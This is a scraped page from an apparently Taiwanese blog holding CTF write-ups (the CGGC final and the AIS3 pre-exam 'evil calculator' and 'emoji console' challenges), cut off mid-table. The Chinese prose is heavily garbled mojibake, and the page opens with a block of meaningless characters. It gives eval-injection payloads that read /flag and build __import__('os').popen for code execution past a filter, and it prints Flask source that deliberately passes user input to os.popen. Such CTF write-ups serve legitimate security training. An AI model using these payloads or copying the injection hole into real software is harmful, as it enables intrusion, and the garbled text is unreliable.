N0Ã©Ã¯Î¶Îœâ—˜Ï€|Fâ•”Ã³Ã¼Î±â•—ÎˆÃ´ÎŠâ†‘Ï…ZÎ¾Î_3Ã‘â™€Î¾Ã¶ÎŸÃ¦ÂºÏˆÎ¶Îœâ•šÃƒÃ¦Ã¦Î°Ï‰Ã¥â™€Î»Î—Ã†5nÏ„â™ªÃ¨5Â°Â¡Î¨ÂºvÎªGÎ›ÎœÏÎ’Î£1Ã¶Îqâ•Ã¶Ã´Î¿ÏˆW4Ã¨aÏƒÎDÎ¤Ã“sâ”˜oâ•”ï£¿=â”‚Â¶Ã‰ÎŒâ™‚Ï‹cÃ«Î¬bÎ¬Î”ÃbÎ½Ã¼â”Î™&amp;Î¥TEÏ…BÎ‰Ï‹â†”8Î¹Ã®Î¡â•Ã!Î†Î”ÎŒ+Â¶2Ã¶Ï„â—™zÎ§Î•[&lt;â†’,Î†Ã²cÃ„j-Ã“fÂ£7Qâ–¶N)Î—Îœ&gt;92kÎºÃªÎ«`â†”tÏ†Î²â”˜JwÃ¬Ã‡^Ã…X|Î¤7~3Ãª4â””Î«zÂ£Ã…ÎºysÎ Yâ–¼ÎÃ´uÃ‹\UÎœOÃ„Î¿Î‰IoÃ­Î–B/ZÎ¦Î™ÎVqwFAXÎ£|:â•?Î­â•iBV$Î§ï£¿Î«Î±YnÎ„aâ†”Î™BÃ‚-$Î†â–¼Î¹â•MÎµÎ¼Î»Â¶ Î¨Ã³ÏÃ¡â”ŒÎ½Ã“Ã”â”˜â–²0Ïƒâ†RÂ¶ÎµFWÏ‰â†‘sÏˆ?.Ã¢#Î´Â§Î¯â”ŒÎ“Î‰ayÂ£%]Î£ÃUÎŸtÃ–UÎ¶Î½Î¾/Ã”yÃ¶Câ˜¼â•šMâ–¼=;Î™&quot;8â”€Ã„UÃ–Ã‘Î«Ã£Î&gt;Î´4Î¾Î®:Î£Î²ÂºÏŒÎ›Î’~â•‘Oâ†“LÎÏw&quot;Ï‡â™‚-â†“ÃšnÃ¨Ï‰rÃ…Ã­â—˜ÎœÃšÃ­VtÎ°(Î“ZPÎšiÃª9FÎ®ÎŸÂ°râ”€Ïƒâ—€Î¯â™¬?Â¿Î“ÏŒhXEÎˆ,Ï…m;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/07/2024-CGGC-CTF-Final-Writeup/cat.jpg"></p>
<h3 id="å¾Œè¨˜-1"><a href="#å¾Œè¨˜-1" class="headerlink" title="å¾Œè¨˜"></a>å¾Œè¨˜</h3><p>é€™é¡Œæ˜¯ç”¨ @chummy çš„ <a target="_blank" rel="noopener" href="https://github.com/Jimmy01240397/CTF-Instancer">CTF Instancer</a> æ¶çš„ï¼Œæœƒä¾åºå‹•æ…‹é–‹ 100 å€‹ portçµ¦å¤§å®¶é€£ instancer ï¼Œçµæœæœ‰æŸæµ·ç‹—ç›´æ¥ç‹‚æˆ³ port å¹«å¤§å®¶æŠŠ instancer éƒ½é—œèµ·ä¾†ï¼ˆæˆ‘å®Œå…¨æ²’æƒ³åˆ°å¯ä»¥é€™æ¨£ç©QQï¼‰</p>
<p><img src="/2024/12/07/2024-CGGC-CTF-Final-Writeup/4.png"></p>
<p>å¾Œä¾†è‡¨æ™‚åŠ äº†é©—è­‰ <code>CTFd Token</code> çš„æ©Ÿåˆ¶ï¼Œæ„Ÿè¬è³½åšæ°´é›»å·¥ Chummy ç¾å ´å¹« instancer åŠ æ–°åŠŸèƒ½ï¼Œç„¶å¾Œå…©å€‹äººåœ¨é‚£é‚Šå¯«çˆ›æ‰£<br><img src="/2024/12/07/2024-CGGC-CTF-Final-Writeup/5.png"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2024-06-30T06:04:15.000Z" title="2024/6/30 ä¸‹åˆ2:04:15">2024-06-30</time>ç™¼è¡¨</span><span class="level-item"><time dateTime="2024-11-17T04:45:30.736Z" title="2024/11/17 ä¸‹åˆ12:45:30">2024-11-17</time>æ›´æ–°</span><span class="level-item"><a class="link-muted" href="/categories/Cybersecurity/">Cybersecurity</a><span>Â /Â </span><a class="link-muted" href="/categories/Cybersecurity/CTF/">CTF</a><span>Â /Â </span><a class="link-muted" href="/categories/Cybersecurity/CTF/Writeup/">Writeup</a></span><span class="level-item">17 åˆ†é˜è®€å®Œ (å¤§ç´„2538å€‹å­—)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/06/30/2024-AIS3-pre-exam-MFCTF-writeup/">2024 AIS3 pre-exam &amp; MFCTF writeup</a></p><div class="content"><h1 id="2024-AIS3-pre-exam-writeup"><a href="#2024-AIS3-pre-exam-writeup" class="headerlink" title="2024 AIS3 pre-exam writeup"></a>2024 AIS3 pre-exam writeup</h1><p>é€™æ¬¡å¹« AIS3 pre-exam å’Œ MFCTF å‡ºé¡Œï¼Œå‡ºäº†å…©é¡Œï¼šä¸€é¡Œ web å’Œä¸€é¡Œ misc (ä½†å…¶å¯¦å…©é¡Œéƒ½æ˜¯web)</p>
<h2 id="evil-calculator"><a href="#evil-calculator" class="headerlink" title="evil calculator"></a>evil calculator</h2><blockquote>
<p>This is a calculator written in Python. Itâ€™s a simple calculator, but some function in it is VERY EVIL!!<br>Connection info: <a target="_blank" rel="noopener" href="http://chals1.ais3.org:5001/">http://chals1.ais3.org:5001</a><br>Author: TriangleSnake</p>
</blockquote>
<p>é€™æ˜¯ä¸€é¡Œå¾ˆç°¡å–®çš„pyjail(?æœ‰jailå—)ï¼Œä¸»è¦å•é¡Œå‡ºåœ¨ <code>eval()</code> functionï¼Œä½†æ˜¯æœ‰éæ¿¾ <code>_</code> å’Œ <code>space</code> ã€‚<br>å› ç‚ºæ˜¯warmupé¡Œï¼Œé æœŸè§£æ˜¯ç”¨<code>open()</code>è®€flagï¼Œä¸æœƒç”¨åˆ°<code>_</code>å’Œ<code>space</code>ã€‚</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span><span class="string">&quot;open(&#x27;/flag&#x27;,&#x27;r&#x27;).read()&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>ç•¶ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥æŠŠ <code>_</code> å’Œ <code>space</code> encode å¾Œ rce</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span><span class="string">&quot;eval(eval(&#x27;chr(95)&#x27;)+eval(&#x27;chr(95)&#x27;)+&#x27;import&#x27;+eval(&#x27;chr(95)&#x27;)+eval(&#x27;chr(95)&#x27;)+\&quot;(&#x27;os&#x27;).popen(&#x27;&#x27;).read()\&quot;)&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>AIS3{7RiANG13_5NAK3_I5_50_3Vi1}</p>
</blockquote>
<h2 id="emoji-console"><a href="#emoji-console" class="headerlink" title="emoji console"></a>emoji console</h2><blockquote>
<p>ğŸ”ºğŸ ğŸ˜¡ ğŸ…°ï¸ ğŸ†’ 1ï¸âƒ£â“‚ï¸ğŸ…¾ï¸ ğŸš…â˜ ï¸âœ‰ï¸ ğŸ¥«ğŸ«µ ğŸ”ğŸš©â‰ï¸<br>Connection info: <a target="_blank" rel="noopener" href="http://chals1.ais3.org:5000/">http://chals1.ais3.org:5000</a><br>Author: TriangleSnake</p>
</blockquote>
<p>é€™é¡Œå’Œè³‡å®‰æ²’ä»€éº¼é—œä¿‚ï¼Œç´”ç²¹æ˜¯æ‹¼å­—éŠæˆ²ï¼Œå¯ä»¥éš¨ä¾¿æŒ‰å¹¾å€‹ emoji å¾Œå°±å¯ä»¥ç™¼ç¾ä»–å°±æ˜¯æŠŠä½ è¼¸å…¥çš„ emoji è½‰æˆè‹±æ–‡å–®å­—å¾Œè®Šæˆä¸€è¡ŒæŒ‡ä»¤</p>
<p><img src="/2024/06/30/2024-AIS3-pre-exam-MFCTF-writeup/1.png" alt="image"></p>
<p>è©¦å¹¾æ¬¡æœƒç™¼ç¾ä¸€äº›å¸¸ç”¨çš„æŒ‡ä»¤ï¼Œåƒæ˜¯ ğŸ±-&gt;<code>cat</code> ã€ ğŸ’¿-&gt;<code>cd</code> ï¼Œé‚„æœ‰é¡Œç›®å‰›é€²å»å°±æç¤ºçš„ ğŸ-&gt;<code>python</code> å’Œ â­-&gt;<code>*</code></p>
<ol>
<li>å˜—è©¦ä½¿ç”¨ <code>cat</code> å‘½ä»¤çœ‹ç›®éŒ„ä¸‹é¢æœ‰ä»€éº¼<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ğŸ± â­</span><br></pre></td></tr></table></figure></li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,send_file,request,redirect,jsonify,render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">translate</span>(<span class="params">command:<span class="built_in">str</span></span>)-&gt;<span class="built_in">str</span>:</span><br><span class="line">    emoji_table = json.load(<span class="built_in">open</span>(<span class="string">&#x27;emoji.json&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> emoji_table:</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> command:</span><br><span class="line">            command = command.replace(key,emoji_table[key])</span><br><span class="line">    <span class="keyword">return</span> command.lower()</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    command = request.args.get(<span class="string">&#x27;command&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">set</span>(command).intersection(<span class="built_in">set</span>(string.printable.replace(<span class="string">&quot; &quot;</span>,<span class="string">&#x27;&#x27;</span>))))&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;command&#x27;</span>:command,<span class="string">&#x27;result&#x27;</span>:<span class="string">&#x27;Invalid command&#x27;</span>&#125;)</span><br><span class="line">    command = translate(command)</span><br><span class="line">    result = os.popen(command+<span class="string">&quot; 2&gt;&amp;1&quot;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;command&#x27;</span>:command,<span class="string">&#x27;result&#x27;</span>:result&#125;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;ğŸ˜€&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜‚&quot;</span>: <span class="string">&quot;:&#x27;)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤£&quot;</span>: <span class="string">&quot;XD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜ƒ&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜„&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜…&quot;</span>: <span class="string">&quot;&#x27;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜†&quot;</span>: <span class="string">&quot;XD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜‰&quot;</span>: <span class="string">&quot;;)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜Š&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜‹&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;B)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜˜&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜—&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜™&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜š&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â˜ºï¸&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ™‚&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤—&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤©&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤”&quot;</span>: <span class="string">&quot;:?&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤¨&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;:|&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜‘&quot;</span>: <span class="string">&quot;:|&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜¶&quot;</span>: <span class="string">&quot;:|&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ™„&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;:]&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜£&quot;</span>: <span class="string">&quot;&gt;:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜¥&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜®&quot;</span>: <span class="string">&quot;:o&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤&quot;</span>: <span class="string">&quot;:x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜¯&quot;</span>: <span class="string">&quot;:o&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜ª&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜«&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜´&quot;</span>: <span class="string">&quot;Zzz&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜Œ&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜›&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜œ&quot;</span>: <span class="string">&quot;;P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;XP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤¤&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜’&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜“&quot;</span>: <span class="string">&quot;;/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜”&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜•&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ™ƒ&quot;</span>: <span class="string">&quot;(:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤‘&quot;</span>: <span class="string">&quot;$)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜²&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â˜¹ï¸&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ™&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜–&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜Ÿ&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜¤&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜¢&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜­&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜¦&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜§&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜¨&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜©&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤¯&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜¬&quot;</span>: <span class="string">&quot;:E&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜°&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜±&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¥µ&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¥¶&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜³&quot;</span>: <span class="string">&quot;:$&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤ª&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜µ&quot;</span>: <span class="string">&quot;X(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¥´&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜ &quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜¡&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤¬&quot;</span>: <span class="string">&quot;#$%&amp;!&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤•&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤¢&quot;</span>: <span class="string">&quot;X(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤®&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤§&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜‡&quot;</span>: <span class="string">&quot;O:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¥³&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¥º&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤¡&quot;</span>: <span class="string">&quot;:o)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤ &quot;</span>: <span class="string">&quot;Y)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤¥&quot;</span>: <span class="string">&quot;:L&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤«&quot;</span>: <span class="string">&quot;:x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤­&quot;</span>: <span class="string">&quot;:x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¶&quot;</span>: <span class="string">&quot;dog&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ±&quot;</span>: <span class="string">&quot;cat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ­&quot;</span>: <span class="string">&quot;mouse&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¹&quot;</span>: <span class="string">&quot;hamster&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ°&quot;</span>: <span class="string">&quot;rabbit&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦Š&quot;</span>: <span class="string">&quot;fox&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ»&quot;</span>: <span class="string">&quot;bear&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¼&quot;</span>: <span 